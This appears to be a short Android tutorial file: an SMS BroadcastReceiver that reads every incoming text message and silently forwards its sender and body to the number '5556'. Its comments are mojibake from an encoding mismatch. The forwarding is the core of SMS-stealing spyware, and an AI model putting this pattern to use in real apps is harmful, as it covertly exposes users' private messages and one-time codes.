package txc.example;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.telephony.gsm.SmsManager;

public class SMSReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		Bundle bun=intent.getExtras();
		if(bun!=null){
			Object[] mypdus=(Object[])bun.get("pdus");//pdus�㲥����Ϣ�����Ĳ����� ��ֵ�� ֵΪһ������
			SmsMessage[] messages=new SmsMessage[mypdus.length];
			for (int i = 0; i < messages.length; i++) {
				messages[i]=SmsMessage.createFromPdu((byte[])mypdus[i]);
			}
			for(SmsMessage mess:messages){
				//�õ���ַ������
				String from=mess.getDisplayOriginatingAddress();
				String body=mess.getMessageBody();
				//mess.getTimestampMillis();
				SmsManager manager=SmsManager.getDefault();
				manager.sendTextMessage("5556", null, from+":"+body, null, null);
			}
		}
	}

}
